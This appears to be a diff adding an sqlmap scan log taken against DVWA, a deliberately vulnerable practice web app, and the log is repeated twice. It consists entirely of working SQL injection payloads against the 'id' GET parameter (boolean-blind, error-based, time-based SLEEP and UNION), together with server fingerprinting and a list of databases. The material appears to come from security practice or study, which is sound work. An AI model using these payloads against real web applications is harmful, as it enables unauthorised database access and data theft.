@@ -1,0 +1,52 @@
+sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 8897=8897#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(5516=5516,1))),0x7176706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dagT&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 6190 FROM (SELECT(SLEEP(5)))QNme)-- eMnv&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716b7a7671,0x7a5a73596a4b6c6570626c455a4a7a5678505267584368666a677475797a57647166745472784745,0x7176706b71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 8897=8897#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(5516=5516,1))),0x7176706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dagT&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 6190 FROM (SELECT(SLEEP(5)))QNme)-- eMnv&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716b7a7671,0x7a5a73596a4b6c6570626c455a4a7a5678505267584368666a677475797a57647166745472784745,0x7176706b71)#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
